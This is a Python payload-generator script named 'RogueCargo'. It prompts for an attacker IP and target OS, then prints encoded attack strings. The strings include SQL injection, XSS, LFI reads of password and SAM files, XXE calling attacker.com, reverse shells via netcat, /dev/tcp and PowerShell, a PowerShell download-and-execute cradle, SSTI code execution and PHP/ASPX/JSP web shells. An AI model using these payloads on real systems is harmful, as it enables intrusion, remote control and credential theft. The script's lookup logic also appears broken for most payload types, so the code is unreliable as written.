import argparse
import os
import json
import base64
import urllib.parse

def ask_question(question, options):
    print(f"\n{question}")
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")
    
    choice = input("Select an option (number): ")
    while not choice.isdigit() or int(choice) not in range(1, len(options) + 1):
        choice = input("Invalid choice. Please select a valid option: ")
    
    return options[int(choice) - 1]

def encode_payload(payload):
    print("\n[+] Select encoding method:")
    encoding_method = ask_question("Choose an encoding technique:", ["None", "Base64", "URL Encoding", "Hex"])
    
    if encoding_method == "Base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding_method == "URL Encoding":
        return urllib.parse.quote(payload)
    elif encoding_method == "Hex":
        return payload.encode().hex()
    return payload

def suggest_payloads(payload_type, os_type, attacker_ip, custom_payloads):
    payloads = {
        "SQL Injection": [
            "' OR '1'='1' --", 
            "admin' --", 
            "1' UNION SELECT null, username, password FROM users --",
            "1 AND SLEEP(5) --", 
            "1' AND 1=CAST((SELECT @@version) AS INT) --"
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(document.domain)>"
        ],
        "LFI": {
            "Linux": [
                "../../../../etc/passwd", 
                "../../../../var/log/apache2/access.log", 
                "/proc/self/environ",
                "/etc/hosts",
                "/etc/group",
                "/etc/shadow",
                "/root/.bash_history",
                "/var/log/auth.log"
            ],
            "Windows": [
                "C:\\Windows\\win.ini",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\repair\\sam",
                "C:\\Windows\\System32\\config\\SAM"
            ]
        },
        "XXE": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/malicious.dtd\">]><foo>&xxe;</foo>"
        ],
        "SSRF": [
            f"http://{attacker_ip}:8080/admin",
            f"file:///etc/passwd"
        ],
        "LDAP Injection": [
            "*)(|(cn=*))", 
            "*)(|(uid=*))(|(uid=admin))"
        ],
        "Command Injection": {
            "Linux": [
                f"; nc -e /bin/sh {attacker_ip} 4444",
                f"| bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                f"; /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1'"
            ],
            "Windows": [
                f"& powershell -NoP -NonI -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/shell.ps1')\""
            ]
        },
        "SSTI": [
            "{{7*7}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
            "{{config.items()}}",
            "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
        ],
        "Shell": {
            "Linux": [
                f"bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                f"nc -e /bin/bash {attacker_ip} 4444"
            ],
            "Windows": [
                f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            ]
        },
        "Web Shells": [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php eval($_POST['cmd']); ?>",
            "<%@ Page Language=\"C#\" Debug=\"true\" Trace=\"true\"%> <script runat=\"server\"> void Page_Load(object sender, EventArgs e) { System.Diagnostics.Process.Start(Request[\"cmd\"]); } </script>",
            "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        ]
    }
    
    # Merge custom payloads
    if payload_type in custom_payloads:
        payloads[payload_type].extend(custom_payloads[payload_type])
    
    print(f"\n[+] Suggested Payloads for {payload_type} (OS: {os_type}):")
    for payload in payloads.get(payload_type, {}).get(os_type, payloads.get(payload_type, ["No payloads available"])):
        encoded_payload = encode_payload(payload)
        print(f"  - {encoded_payload}")

def main():
    print("\n🔥 Welcome to RogueCargo - Your Payload Generator 🔥")
    
    attacker_ip = input("Enter your attacker IP (for reverse shells, etc.): ")
    
    payload_type = ask_question("What type of payload do you need?", ["SQL Injection", "XSS", "LFI", "XXE", "SSRF", "LDAP Injection", "Command Injection", "SSTI", "Shell", "Web Shells"])
    
    os_type = ask_question("What is the target operating system?", ["Linux", "Windows", "Unknown"])
    
    custom_payloads = {}
    suggest_payloads(payload_type, os_type, attacker_ip, custom_payloads)

if __name__ == "__main__":
    main()
